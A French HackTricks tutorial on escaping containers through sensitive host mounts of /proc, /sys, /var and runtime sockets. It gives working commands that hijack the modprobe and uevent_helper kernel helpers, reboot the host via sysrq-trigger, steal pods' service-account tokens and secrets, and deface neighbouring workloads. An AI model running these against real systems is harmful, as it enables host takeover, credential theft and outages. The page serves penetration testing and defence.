# Montages sensibles de l'hôte

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Les montages de l'hôte sont l'une des surfaces d'attaque pratiques les plus importantes pour le container-escape car ils font souvent s'effondrer une vue de processus soigneusement isolée pour revenir à une visibilité directe des ressources de l'hôte. Les cas dangereux ne se limitent pas à `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, ou des chemins liés aux périphériques peuvent exposer des contrôles du kernel, des credentials, les systèmes de fichiers des containers voisins, et des interfaces de gestion runtime.

Cette page existe séparément des pages de protection individuelles parce que le modèle d'abus est transversal. Un writable host mount est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin hôte exact qui a été exposé. Le traiter comme un sujet à part rend la surface d'attaque beaucoup plus facile à analyser.

## Exposition de `/proc`

procfs contient à la fois des informations de processus ordinaires et des interfaces de contrôle du kernel à fort impact. Un bind mount tel que `-v /proc:/host/proc` ou une vue du container qui expose des entrées proc inattendues en écriture peut donc conduire à une divulgation d'informations, un déni de service, ou une exécution directe de code sur l'hôte.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abus

Commencez par vérifier quelles entrées procfs à haute valeur sont visibles ou en écriture :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour des raisons différentes. `core_pattern`, `modprobe` et `binfmt_misc` peuvent devenir des vecteurs d'exécution de code sur l'hôte lorsqu'ils sont écrits. `kallsyms`, `kmsg`, `kcore` et `config.gz` sont des sources de renseignement puissantes pour l'exploitation du noyau. `sched_debug` et `mountinfo` révèlent le contexte des processus, des cgroups et du système de fichiers, ce qui peut aider à reconstituer l'agencement de l'hôte depuis l'intérieur du conteneur.

La valeur pratique de chaque chemin est différente, et traiter tous comme s'ils avaient le même impact complique le triage :

- `/proc/sys/kernel/core_pattern`
Si inscriptible, c'est l'un des chemins procfs les plus impactants parce que le noyau exécutera un pipe handler après un crash. Un conteneur capable de pointer `core_pattern` vers une charge utile stockée dans son overlay ou dans un chemin monté de l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle le helper en espace utilisateur utilisé par le noyau lorsqu'il doit invoquer la logique de chargement de modules. S'il est inscriptible depuis le conteneur et interprété dans le contexte de l'hôte, il peut devenir un autre primitif d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné avec un moyen de déclencher le chemin du helper.
- `/proc/sys/vm/panic_on_oom`
Ce n'est généralement pas un primitif d'évasion propre, mais il peut convertir la pression mémoire en un déni de service à l'échelle de l'hôte en transformant les conditions OOM en comportement de panic du noyau.
- `/proc/sys/fs/binfmt_misc`
Si l'interface d'enregistrement est inscriptible, l'attaquant peut enregistrer un handler pour une valeur magic choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le triage d'exploits du noyau. Il permet de déterminer quels sous-systèmes, mitigations et options du noyau sont activés sans avoir besoin des métadonnées de paquets de l'hôte.
- `/proc/sysrq-trigger`
Majoritairement un chemin de déni de service, mais un chemin très sérieux. Il peut redémarrer, provoquer un panic ou perturber l'hôte immédiatement.
- `/proc/kmsg`
Révèle les messages du ring buffer du noyau. Utile pour le fingerprinting de l'hôte, l'analyse de crashs, et, dans certains environnements, pour le leak d'informations utiles à l'exploitation du noyau.
- `/proc/kallsyms`
Précieux lorsqu'il est lisible car il expose les symboles exportés du noyau et peut aider à contourner les hypothèses de randomisation des adresses lors du développement d'exploits noyau.
- `/proc/[pid]/mem`
C'est une interface directe vers la mémoire d'un processus. Si le processus cible est accessible avec les conditions de type ptrace nécessaires, cela peut permettre de lire ou modifier la mémoire d'un autre processus. L'impact réaliste dépend fortement des identifiants, de hidepid, de Yama et des restrictions ptrace, donc c'est un chemin puissant mais conditionnel.
- `/proc/kcore`
Expose une vue de type image core de la mémoire système. Le fichier est énorme et peu pratique à utiliser, mais s'il est lisible de manière significative, cela indique une surface mémoire de l'hôte mal exposée.
- `/proc/kmem` and `/proc/mem`
Interfaces mémoire brutes historiquement très impactantes. Sur de nombreux systèmes modernes elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables elles doivent être considérées comme des trouvailles critiques.
- `/proc/sched_debug`
Leaks des informations d'ordonnancement et de tâches qui peuvent exposer les identités des processus de l'hôte même lorsque d'autres vues de processus semblent plus propres que prévu.
- `/proc/[pid]/mountinfo`
Extrêmement utile pour reconstituer où le conteneur se trouve réellement sur l'hôte, quelles voies sont backing par un overlay, et si un mount inscriptible correspond à du contenu hôte ou seulement à la couche du conteneur.

Si `/proc/[pid]/mountinfo` ou les détails de l'overlay sont lisibles, utilisez-les pour récupérer le chemin hôte du système de fichiers du conteneur :
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ces commandes sont utiles parce qu'un certain nombre d'astuces d'exécution sur l'hôte nécessitent de convertir un chemin à l'intérieur du conteneur en le chemin correspondant du point de vue de l'hôte.

### Exemple complet : `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le conteneur et que le helper path est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant :
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du noyau, mais l'important est qu'un chemin helper inscriptible peut rediriger un futur appel du helper du noyau vers du contenu host-path contrôlé par l'attaquant.

### Exemple complet : Reconnaissance du noyau avec `kallsyms`, `kmsg`, et `config.gz`

Si l'objectif est d'évaluer l'exploitabilité plutôt que d'obtenir une évasion immédiate :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes aident à déterminer si des informations utiles sur les symboles sont visibles, si les messages récents du kernel révèlent un état intéressant, et quelles fonctionnalités ou mitigations du kernel sont compilées. L'impact n'est généralement pas une évasion directe, mais cela peut fortement raccourcir le triage des vulnérabilités du kernel.

### Full Example: SysRq Host Reboot

Si `/proc/sysrq-trigger` est accessible en écriture et atteint la host view:
```bash
echo b > /proc/sysrq-trigger
```
L'effet est un redémarrage immédiat de l'hôte. Ce n'est pas un exemple subtil, mais il montre clairement que l'exposition de procfs peut être bien plus grave qu'une simple divulgation d'informations.

## Exposition de `/sys`

sysfs expose de grandes quantités d'état du kernel et des périphériques. Certains chemins sysfs sont principalement utiles pour le fingerprinting, tandis que d'autres peuvent affecter l'exécution des helpers, le comportement des périphériques, la configuration des security-modules, ou l'état du firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins sont importants pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de gestion thermique et donc la stabilité de l'hôte dans des environnements fortement exposés. `/sys/kernel/vmcoreinfo` peut leak des informations de crash-dump et d'agencement du kernel qui aident au fingerprinting de bas niveau de l'hôte. `/sys/kernel/security` est l'interface `securityfs` utilisée par les Linux Security Modules, donc un accès inattendu peut exposer ou modifier l'état lié au MAC. Les chemins des variables EFI peuvent affecter les paramètres de boot gérés par le firmware, ce qui les rend bien plus sérieux que de simples fichiers de configuration. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car il s'agit intentionnellement d'une interface orientée développeur avec beaucoup moins d'attentes de sécurité que les APIs kernel destinées à la production durcies.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est writable, le kernel peut exécuter un helper contrôlé par un attaquant lorsqu'un `uevent` est déclenché :
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l'hôte. Une fois déclenché, le helper s'exécute dans le contexte de l'hôte plutôt qu'à l'intérieur du container actuel.

## `/var` Exposition

Monter le `/var` de l'hôte dans un container est souvent sous-estimé car cela ne semble pas aussi spectaculaire que de monter `/`. En pratique, cela peut suffire pour atteindre les runtime sockets, les répertoires de snapshots de container, les volumes de pod gérés par kubelet, les projected service-account tokens, et les systèmes de fichiers d'applications voisins. Sur les nœuds modernes, `/var` est souvent l'endroit où se trouve l'état des containers le plus intéressant d'un point de vue opérationnel.

### Kubernetes Exemple

Un pod avec `hostPath: /var` peut souvent lire les projected tokens d'autres pods et le contenu des snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles car elles permettent de déterminer si le mount n'expose que des données applicatives banales ou des cluster credentials à fort impact. Un service-account token lisible peut immédiatement transformer local code execution en un accès à la Kubernetes API.

Si le token est présent, vérifiez ce à quoi il donne accès plutôt que de vous arrêter à la simple découverte du token :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impact ici peut être bien plus important que l'accès local au nœud. Un token avec un RBAC étendu peut transformer un montage de `/var` en compromission à l'échelle du cluster.

### Exemple Docker et containerd

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur des nœuds Kubernetes fonctionnant avec containerd, elles peuvent se trouver sous `/var/lib/containerd` ou sous des chemins spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le `/var` monté expose le contenu d'un snapshot modifiable en écriture d'une autre charge de travail, l'attaquant peut être en mesure de modifier des fichiers d'application, déposer du contenu web, ou changer des scripts de démarrage sans toucher à la configuration actuelle du conteneur.

Idées concrètes d'abus une fois que du contenu de snapshot modifiable en écriture est trouvé :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ces commandes sont utiles car elles montrent les trois principales familles d'impact d'un `/var` monté : altération de l'application, récupération de secrets et mouvement latéral vers des charges de travail voisines.

## Sockets d'exécution

Les montages d'hôtes sensibles incluent souvent des sockets d'exécution plutôt que des répertoires complets. Ces derniers sont si importants qu'ils méritent d'être mentionnés explicitement ici :
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flux d'exploitation complets une fois qu'un de ces sockets est monté.

Voici un premier modèle d'interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l'une d'elles réussit, le chemin depuis "mounted socket" jusqu'à "start a more privileged sibling container" est généralement beaucoup plus court que pour n'importe quel kernel breakout.

## CVE liées aux montages

Les montages sur l'hôte croisent aussi des vulnérabilités runtime. Des exemples récents importants incluent :

- `CVE-2024-21626` dans `runc`, où un leaked descripteur de fichier de répertoire pourrait placer le répertoire de travail sur le système de fichiers de l'hôte.
- `CVE-2024-23651` et `CVE-2024-23653` dans BuildKit, où OverlayFS copy-up races pourraient produire des écritures sur des chemins hôtes pendant les builds.
- `CVE-2024-1753` dans les flux de build Buildah et Podman, où des bind mounts spécifiquement conçus pendant le build pourraient exposer `/` en lecture-écriture.
- `CVE-2024-40635` dans containerd, où une grande valeur `User` pourrait déborder et aboutir à un comportement équivalent à UID 0.

Ces CVE sont importantes ici car elles montrent que la gestion des montages ne se limite pas à la configuration de l'opérateur. Le runtime lui-même peut aussi introduire des conditions d'évasion induites par les montages.

## Vérifications

Utilisez ces commandes pour repérer rapidement les expositions de montages à plus forte valeur :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce qui est intéressant ici :

- La racine de l'hôte, `/proc`, `/sys`, `/var` et les sockets d'exécution sont toutes des découvertes à haute priorité.
- Les entrées proc/sys inscriptibles signifient souvent que le montage expose des contrôles du noyau globaux de l'hôte plutôt qu'une vue sécurisée du conteneur.
- Les chemins `/var` montés méritent une revue des identifiants et des charges de travail voisines, pas seulement du système de fichiers.
{{#include ../../../banners/hacktricks-training.md}}
